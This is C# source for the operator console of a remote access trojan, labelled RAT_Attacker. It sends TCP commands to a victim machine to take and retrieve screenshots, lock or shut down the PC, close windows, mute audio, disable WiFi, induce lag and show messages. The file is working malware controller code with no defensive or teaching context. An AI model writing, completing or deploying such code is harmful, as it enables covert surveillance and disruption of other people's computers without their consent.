using RAT_Library;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;

namespace RAT_Attacker
{
    public partial class MainWindow
    {
        private Socket _client;

        public MainWindow()
        {
            InitializeComponent();
        }

        private void SendCommand(RatCommand command, IEnumerable<byte> data = null)
        {
            IsEnabled = false;
            _client = new Socket(SocketType.Stream, ProtocolType.Tcp);
            _client.BeginConnect(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), Common.Port), ar =>
            {
                try
                {
                    _client.EndConnect(ar);
                    var commandId = new[] { (byte)command };
                    _client.Send(data == null ? commandId : commandId.Concat(data).ToArray());
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.ConnectionRefused)
                    {
                        Dispatcher.Invoke(() =>
                            MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error));
                    }
                }
                finally
                {
                    Dispatcher.Invoke(() => IsEnabled = true);
                }
            }, null);
        }

        private void CloseActiveWindow(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.CloseActiveWindow);
        }

        private void ShowMessageBox(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.ShowMessageBox);
        }

        private void TakeScreenshot(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.TakeScreenshot);

            var buffer = new byte[Common.BufferSize];
            _client.Receive(buffer);

            var bitmapImage = new BitmapImage();
            bitmapImage.BeginInit();
            bitmapImage.StreamSource = new MemoryStream(buffer);
            bitmapImage.EndInit();

            ScreenshotImage.Source = bitmapImage;
        }

        private void Lock(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.Lock);
        }

        private void Shutdown(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.Shutdown);
        }

        private void SendMessage(object sender, RoutedEventArgs e)
        {
            var trimmedText = MessageTextBox.Text.Trim(' ');
            if (trimmedText == "") return;
            SendCommand(RatCommand.SendMessage, Common.MessageEncoding.GetBytes(trimmedText));
            MessageTextBox.Clear();
        }

        private void MessageTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
                SendMessage(sender, e);
        }

        private void PlaySound(object sender, RoutedEventArgs e)
        {
            var filePath = AudioFileTextBox.Text;
            if (File.Exists(filePath) && Path.GetExtension(filePath) == ".wav")
                SendCommand(RatCommand.PlaySound, File.ReadAllBytes(filePath));
            else
                MessageBox.Show("File must have wav extension", "Input error", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private void Mute(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.Mute);
        }

        private void DisableWiFi(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.DisableWiFi);
        }

        private void Lag(object sender, RoutedEventArgs e)
        {
            SendCommand(RatCommand.Lag);
        }
    }
}
